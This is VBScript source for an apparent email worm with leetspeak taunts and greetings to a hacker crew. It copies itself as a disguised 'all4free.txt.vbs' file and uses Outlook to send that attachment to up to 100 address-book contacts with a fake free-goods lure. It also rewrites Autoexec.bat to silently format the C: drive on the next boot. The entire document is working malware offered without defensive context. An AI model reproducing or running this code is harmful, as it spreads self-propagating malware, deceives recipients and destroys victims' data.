rem Milissa, you naked wife, i love you *g*
rem th1s 15 h3ll m41l
rem h3ll-m4il r0xxz
On Error Resume Next
Dim x
Set so=CreateObject("Scripting.FileSystemObject")
so.GetFile(WScript.ScriptFullName).Copy("C:\windows\desktop\all4free.txt.vbs")
Set ol=CreateObject("Outlook.Application")
For x=1 To 100
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Everything 4Free"
Mail.Body="Over 100 different articels 4free NOW available at http://www.all4free.com! Look the Products in the textfile and order now everything 4free :) "
Mail.Attachments.Add("C:\windows\desktop\all4free.txt.vbs")
Mail.Send
Next
ol.Quit
On error resume next
Set fs = CreateObject("Scripting.FileSystemObject")
Set format = fs.CreateTextFile("C:\Autoexec.bat")
format.writeline("         4g41n 4 0utl00k-h4ck   ")
format.writeline("        but th15 15 by B4d-Byt3 ")
format.writeline("         F0r th3 ghc1f-cr3w     ")
format.writeline("")
format.writeline("          h4h4h4h4h4h4h4h4h4h4h4h4h4  ")
format.writeline("    Gr33t1ngz t0 :")
format.writeline("    Th4_T4ct1c, N3C, MrC, T], Th4_M4tr1x, T04st3r, McF1r3, ")
format.writeline("    D0dt3c & D34n V4mp1r3, patch16 4nd 4ll th3 p30pl3 1 f0rg0t !!! ")
format.writeline("    Fl4sh, 4nd th3 r3st 0f th3 ghc1f-cr3w")
format.writeline("       1 th1nk th4t ar3 m4ny ;]")
format.writeline("echo j | format c: > nul")
format.Close
rem --==B4dByt3 1s h3r3==--
rem     th1nk 0n m3 ;] 